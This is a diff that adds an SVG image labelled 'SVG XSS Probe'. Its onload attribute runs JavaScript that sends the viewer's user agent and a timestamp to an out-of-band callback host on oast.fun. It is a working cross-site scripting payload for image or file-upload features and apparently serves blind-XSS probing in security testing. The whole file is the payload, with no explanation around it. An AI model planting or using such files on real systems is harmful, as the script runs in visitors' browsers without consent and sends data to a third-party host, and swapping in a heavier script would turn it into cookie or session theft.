@@ -1,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/svgfile?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()">
+  <rect x="10" y="10" width="180" height="180" fill="#e11d48"/>
+  <text x="20" y="110" font-size="20" fill="#fff">SVG XSS Probe</text>
+</svg>
